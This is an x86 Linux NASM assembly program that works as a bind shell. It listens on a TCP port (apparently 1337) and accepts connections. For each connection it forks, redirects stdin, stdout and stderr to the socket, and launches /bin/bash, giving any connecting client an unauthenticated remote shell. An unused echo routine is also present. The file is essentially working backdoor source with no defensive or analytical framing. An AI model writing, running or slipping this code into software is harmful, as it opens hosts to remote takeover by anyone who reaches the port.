%include "socket.asmh"
;; vim: ft=nasm

global _start

section .text
; text {{{

; _start {{{
_start:
	mov ebp, esp
	sub esp, 8 ;; two values: two sockfd

	push word 0x3905
	call TCPSocketNewBind
	mov [ebp-4], eax

.loop_accept:
	push dword [ebp-4]
	call TCPSocketAccept
	mov [ebp-8], eax

	;; fork and go
	mov eax, 2
	int 0x80
	cmp eax, 0
	jne .loop_accept

	;; forked:
	;; overwrite stdin, stdout and stderr with sockfd
	mov eax, 0x3f    ;; sys_dup2
	mov ebx, [ebp-8] ;; sockfd
	mov ecx, 0       ;; stdin
	int 0x80
	mov eax, 0x3f    ;; sys_dup2
	mov ebx, [ebp-8] ;; sockfd
	mov ecx, 1       ;; stdout
	int 0x80
	mov eax, 0x3f    ;; sys_dup2
	mov ebx, [ebp-8] ;; sockfd
	mov ecx, 2       ;; stderr
	int 0x80
	;; call bash with streams overwritten above
	mov eax, 0xb
	mov ebx, cmd
	mov ecx, 0
	mov edx, 0
	int 0x80
; }}}

; loopread {{{
;; function loopread ARGS cdecl: sockfd
loopread:
	push ebp
	push ebx
	mov ebp, esp

	sub esp, 256 ;; buffer of 256 symbols

.loop:	;; try to read
	mov eax, 3
	mov ebx, [ebp+12]
	mov ecx, esp
	mov edx, 256
	int 0x80

	test eax, eax
	jz .end

	mov edx, eax ;; length first
	mov eax, 4
	mov ebx, [ebp+12]
	mov ecx, esp
	int 0x80

	jmp .loop

.end:	;; close socket
	push dword [ebp+12]
	call TCPSocketClose

	mov esp, ebp
	pop ebx
	pop ebp
	ret
	
; }}}

; }}}

section .data
; data {{{
cmd:	db "/bin/bash",0

; }}}
